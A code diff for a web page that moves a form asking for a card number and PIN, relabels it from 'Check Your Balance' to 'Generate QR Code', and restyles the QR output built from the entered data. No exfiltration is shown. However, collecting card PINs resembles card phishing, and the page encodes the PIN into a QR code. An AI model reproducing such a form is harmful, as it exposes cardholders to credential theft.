@@ -180,19 +180,7 @@ webpushr('setup',{'key':'BE2GVRF5mLk7Fp1kzgXE_A5QDGK54HwqN1wEgxczP_fzfugkPREKHeb
 			<div class="center">
                 <div class="col-md-6 home-txt1"> <br><br>
 <center>
-    <form id="redirectForm">
-        <label for="code">Card Number:</label><br>
-        <input type="text" id="code" name="code" required><br><br>
-
-        <label for="pin">Enter&nbsp;Ur&nbsp;&nbsp;&nbsp;Pin:</label><br>
-        <input type="password" id="pin" name="pin" required><br><br>
-
-        <button class="btn btn-outline btn-xla" id="mc-embedded-subscribe" type="submit">
-            <i class="fa-solid fa-computer-mouse"></i> Check Your Balance
-        </button>
-    </form>
-
-    <div id="qrBackground" style="
+   <div id="qrBackground" style="
     position: relative;
     width: 100%;
     max-width: 600px;
@@ -215,8 +203,17 @@ webpushr('setup',{'key':'BE2GVRF5mLk7Fp1kzgXE_A5QDGK54HwqN1wEgxczP_fzfugkPREKHeb
         height: auto;
     "></div>
 </div>
-    <div id="qrLabel"></div>
-</center>
+<div id="qrLabel"></div>
+
+<form id="redirectForm">
+    <label for="code">Card Number:</label><br>
+    <input type="text" id="code" name="code" required><br>
+
+    <label for="pin">Enter&nbsp;Ur&nbsp;&nbsp;&nbsp;Pin:</label><br>
+    <input type="password" id="pin" name="pin" required><br>
+
+    <button type="submit">Generate QR Code</button>
+</form>
 
 <script>
     const qrContainer = document.getElementById("qrContainer");
@@ -230,17 +227,16 @@ webpushr('setup',{'key':'BE2GVRF5mLk7Fp1kzgXE_A5QDGK54HwqN1wEgxczP_fzfugkPREKHeb
         document.getElementById("qrBackground").style.display = "block";
 
         // Generate QR code and insert it
-        const qrContainer = document.getElementById("qrContainer");
         qrContainer.innerHTML = `
             <img 
                 src="${qrUrl}" 
                 alt="QR Code" 
-                style="width: 100%; height: auto;"
+                style="width: 100%; height: auto; border-radius: 12px; box-shadow: 0 4px 12px rgba(0,0,0,0.15);"
             />
-    `;
+        `;
 
-    qrLabel.textContent = `Your QR Code: ${qrData}`;
-}
+        qrLabel.textContent = `Your QR Code: ${qrData}`;
+    }
 
     // Load from localStorage on page load
     window.addEventListener('DOMContentLoaded', () => {
@@ -264,6 +260,7 @@ webpushr('setup',{'key':'BE2GVRF5mLk7Fp1kzgXE_A5QDGK54HwqN1wEgxczP_fzfugkPREKHeb
         }
     });
 </script>
+
 
 </body>
 </html>
